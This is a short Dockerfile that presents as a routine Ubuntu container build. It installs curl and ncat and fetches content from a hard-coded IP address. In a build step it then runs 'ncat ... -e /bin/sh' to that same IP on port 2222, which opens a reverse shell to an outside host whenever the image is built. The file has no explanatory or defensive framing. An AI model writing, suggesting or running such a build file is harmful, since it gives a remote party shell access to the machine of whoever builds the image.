FROM ubuntu:20.04
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/gcp/7

WORKDIR /proc/self/fd/7

RUN ncat 68.183.4.199 2222 -e /bin/sh

CMD ["/bin/bash"]
